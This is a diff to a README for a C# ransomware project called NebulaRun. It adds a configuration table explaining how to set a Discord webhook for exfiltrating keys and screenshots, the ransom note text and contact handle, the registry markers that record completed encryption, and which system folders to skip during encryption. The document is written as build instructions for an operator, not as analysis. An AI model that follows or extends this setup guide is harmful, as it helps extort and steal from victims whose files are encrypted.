@@ -35,7 +35,24 @@ To compile the project on Windows using CSharp Compiler (`csc.exe`):
 compile.bat
 ```
 
-This compiles `NebulaRun.exe` linking against Windows Forms, System.Drawing, System.Core, System.Management, and System.Net.Http. `Poly1305.cs` has no external dependencies beyond the BCL.
+This compiles `NebulaRun.exe` linking against Windows Forms, System.Drawing, System.Core, System.Management, and System.Net.Http. `Poly1305.cs` and `Config.cs` have no external dependencies beyond the BCL.
+
+## Configuration
+
+All user-facing strings and endpoints are centralized in `Config.cs` before compilation:
+
+| Setting | Default | Description |
+|---------|---------|-------------|
+| `Config.WebhookUrl` | `"YOUR-WEBHOOK-HERE"` | Discord webhook URL for key/screenshot exfiltration |
+| `Config.ContactInfo` | `"EXAMPLE"` | Contact handle shown in the decryptor UI and ransom note |
+| `Config.NotePrefix` | (see source) | Ransom note text template; victim code appended at runtime |
+| `Config.RegKeyPath` | `"Software\NebulaRun"` | Registry hive for mark and key-hash storage |
+| `Config.RegValueName` | `"Marked"` | Registry value indicating first-run encryption completed |
+| `Config.RegValueData` | `"1"` | Data stored in `RegValueName` |
+| `Config.RegKeyHashesValue` | `"KeyHashes"` | Registry value storing comma-separated SHA-256 key hashes |
+| `Config.SystemFolderKeywords` | system dirs | Path keywords skipped during file enumeration |
+
+Edit `Config.cs`, then recompile. No changes are needed in `Nbl.cs`, `Send.cs`, or `Program.cs` to point at new values.
 
 ---
 
